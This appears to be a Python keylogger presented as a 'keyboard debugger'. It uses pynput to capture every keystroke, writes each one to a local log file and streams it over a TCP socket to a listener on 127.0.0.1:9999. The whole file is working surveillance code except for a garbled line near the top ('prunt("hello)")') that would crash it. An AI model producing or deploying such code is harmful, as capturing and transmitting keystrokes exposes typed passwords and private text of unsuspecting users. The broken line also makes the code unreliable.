from pynput import keyboard
import socket
prunt("hello)")
log_file = "key_debug_log.txt"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect(("127.0.0.1", 9999))
    print("Connected to localhost:9999")
except ConnectionRefusedError:
    print("⚠ Could not connect to localhost:9999. Start a listener first!")
    client = None

def send_data(data: str):
    if client:
        try:
            client.sendall(data.encode("utf-8"))
        except Exception as e:
            print(f"Socket error: {e}")

def on_press(key):
    try:
        data = f"{key.char}\n"
    except AttributeError:
        data = f"{key}\n"
    
    with open(log_file, "a") as f:
        f.write(data)

    print("Pressed:", data.strip())
    send_data(data)

with keyboard.Listener(on_press=on_press) as listener:
    print("Keyboard debugger started. Press ESC to stop.")
    listener.join()
